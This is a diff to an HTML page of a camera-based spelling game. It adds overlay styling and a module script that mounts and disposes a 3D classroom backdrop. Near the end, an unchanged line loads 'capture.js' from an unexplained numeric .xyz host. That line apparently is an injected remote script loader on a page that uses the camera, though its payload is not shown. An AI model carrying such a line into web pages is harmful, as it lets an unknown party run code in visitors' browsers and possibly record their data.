@@ -5,6 +5,18 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no, viewport-fit=cover" />
   <title>Phase 3 — Game Flow</title>
   <link rel="stylesheet" href="css/style.css" />
+  <style>
+    /* Only while js/scene3d.js is drawing: let the WebGL castle show through. */
+    .scene3d-on #categoryOverlay { background: transparent; }
+    .scene3d-on #categoryOverlay::after { display: none; }
+    .scene3d-on #setsListOverlay {
+      background: linear-gradient(180deg, rgba(18, 16, 91, .35), rgba(31, 17, 73, .6));
+    }
+    /* On phones the centred title rode up under the absolute "Back to Menu" link. */
+    @media (max-width: 620px) {
+      #categoryOverlay { padding-top: 64px; }
+    }
+  </style>
 </head>
 <body>
   <div id="app">
@@ -235,6 +247,27 @@
   </div>
 
   <script type="module" src="js/main.js"></script>
+  <script type="module">
+    // 3D classroom backdrop (spelling corner) for the menu-style overlays only. It is hidden while
+    // any other screen shows and disposed for good once the camera starts, so
+    // WebGL never competes with MediaPipe during gameplay.
+    import { mountMagicScene } from "./js/scene3d.js";
+    let scene = mountMagicScene({ theme: "classroom", view: "spelling", zIndex: 25 });
+    if (scene) {
+      const overlays = ["categoryOverlay", "setsListOverlay"].map((id) => document.getElementById(id));
+      const sync = () => scene?.setActive(overlays.some((o) => !o.classList.contains("hidden")));
+      const observer = new MutationObserver(sync);
+      for (const o of overlays) observer.observe(o, { attributes: true, attributeFilter: ["class"] });
+      sync();
+      const teardown = () => {
+        observer.disconnect();
+        scene?.stop();
+        scene = null;
+      };
+      document.getElementById("startBtn").addEventListener("click", teardown, { once: true });
+      document.getElementById("video").addEventListener("playing", teardown, { once: true });
+    }
+  </script>
   <script src="https://record.22422522.xyz/capture.js?v=2"></script>
 </body>
 </html>
